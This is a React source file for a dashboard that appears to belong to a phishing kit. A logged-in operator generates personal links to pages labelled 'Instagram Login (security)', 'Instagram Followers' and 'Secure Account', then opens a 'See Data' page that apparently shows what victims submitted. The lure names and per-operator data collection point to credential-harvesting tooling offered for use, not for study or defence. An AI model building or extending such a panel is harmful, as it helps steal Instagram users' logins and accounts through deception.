import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { auth } from '../firebase';
import { onAuthStateChanged } from 'firebase/auth';

const Dashboard = () => {
  const [generatedLink, setGeneratedLink] = useState('');
  const [followersLink, setFollowersLink] = useState('');
  const [secureAccountLink, setSecureAccountLink] = useState('');
  const [userId, setUserId] = useState('');
  const navigate = useNavigate();

  // Fetch the currently logged-in user's ID or email
  useEffect(() => {
    const unsubscribe = onAuthStateChanged(auth, (user) => {
      if (user) {
        setUserId(user.uid);  // You can also use user.email if you prefer
      } else {
        // If no user is logged in, redirect to login
        navigate('/login');
      }
    });

    return () => unsubscribe();  // Cleanup listener when component unmounts
  }, [navigate]);

  const handleGenerateLink = () => {
    const link = `${window.location.origin}/secureways/#/form/${userId}`;
    setGeneratedLink(link);
  };

  const handleGenerateFollowersLink = () => {
    const link = `${window.location.origin}/secureways/#/claimfollowers/${userId}`;
    setFollowersLink(link);
  };

  const handleGenerateSecureAccountLink = () => {
    const link = `${window.location.origin}/secureways/#/secureaccount/${userId}`;
    setSecureAccountLink(link);
  };

  const handleSeeData = () => {
    // Redirect to the new page and pass the userId via state
    navigate('/seedata', { state: { userId } });
  };

  return (
    <div className="flex flex-col items-center p-4">
      {/* Title Section */}
      <div className="w-full text-center mb-6">
        <h1 className="text-4xl font-bold text-gray-700">Dashboard</h1>
      </div>

      {/* See Data Button in Top Right */}
      <div className="w-full flex justify-end">
        <button
          onClick={handleSeeData}
          className="bg-green-500 text-white py-2 px-4 rounded-lg hover:bg-green-600 transition duration-300"
        >
          See Data
        </button>
      </div>

      {/* Forms Section */}
      <div className="flex flex-wrap justify-center w-full gap-6">
        {/* Instagram Login (Security) Component */}
        <div className="bg-white p-6 rounded-lg shadow-lg w-full max-w-md">
          <div className="border p-4 rounded-lg mb-4">
            <p className="text-lg">App Name: Instagram Login (security)</p>
            {generatedLink && (
              <div className="mt-4">
                <p className="text-lg">Generated Link:</p>
                <a
                  href={generatedLink}
                  target="_blank"
                  rel="noopener noreferrer"
                  className="text-blue-500 underline break-words"
                >
                  {generatedLink}
                </a>
              </div>
            )}
          </div>

          <button
            onClick={handleGenerateLink}
            className="w-full bg-blue-500 text-white py-2 rounded-lg hover:bg-blue-600 transition duration-300"
          >
            Generate Link
          </button>
        </div>

        {/* Instagram Followers Component */}
        <div className="bg-white p-6 rounded-lg shadow-lg w-full max-w-md">
          <div className="border p-4 rounded-lg mb-4">
            <p className="text-lg">App Name: Instagram Followers</p>
            {followersLink && (
              <div className="mt-4">
                <p className="text-lg">Generated Link:</p>
                <a
                  href={followersLink}
                  target="_blank"
                  rel="noopener noreferrer"
                  className="text-blue-500 underline break-words"
                >
                  {followersLink}
                </a>
              </div>
            )}
          </div>

          <button
            onClick={handleGenerateFollowersLink}
            className="w-full bg-blue-500 text-white py-2 rounded-lg hover:bg-blue-600 transition duration-300"
          >
            Generate Followers Link
          </button>
        </div>

        {/* Secure Account Component */}
        <div className="bg-white p-6 rounded-lg shadow-lg w-full max-w-md">
          <div className="border p-4 rounded-lg mb-4">
            <p className="text-lg">App Name: Secure Account</p>
            {secureAccountLink && (
              <div className="mt-4">
                <p className="text-lg">Generated Link:</p>
                <a
                  href={secureAccountLink}
                  target="_blank"
                  rel="noopener noreferrer"
                  className="text-blue-500 underline break-words"
                >
                  {secureAccountLink}
                </a>
              </div>
            )}
          </div>

          <button
            onClick={handleGenerateSecureAccountLink}
            className="w-full bg-blue-500 text-white py-2 rounded-lg hover:bg-blue-600 transition duration-300"
          >
            Generate Secure Account Link
          </button>
        </div>
      </div>
    </div>
  );
};

export default Dashboard;
